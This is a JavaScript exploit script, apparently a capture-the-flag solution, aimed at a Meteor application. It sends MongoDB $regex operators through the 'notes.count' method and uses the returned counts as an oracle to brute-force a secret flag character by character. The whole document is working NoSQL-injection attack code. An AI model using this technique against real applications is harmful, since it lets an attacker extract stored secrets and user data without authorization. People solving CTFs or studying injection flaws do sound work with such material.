let flag = "flag{";
const list_char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}!@#{$_- ";

const count = (char) => {
  return new Promise((resolve,reject) => {
    setTimeout(() => {
      Meteor.call('notes.count',{
        body : {
          $regex :`${char}`
        }
      },function(err ,res ){
        if(err) reject(error);
        resolve(res);
      });
      });
  });
}

const brute_flag = async () => {
  for(let i=0; i<70;i++){
    for(let char of list_char){
      let res = await count(flag+char);
      if(res){
        flag += char;
        console.log(flag);
        break;
      }
    }
  }
}

brute_flag();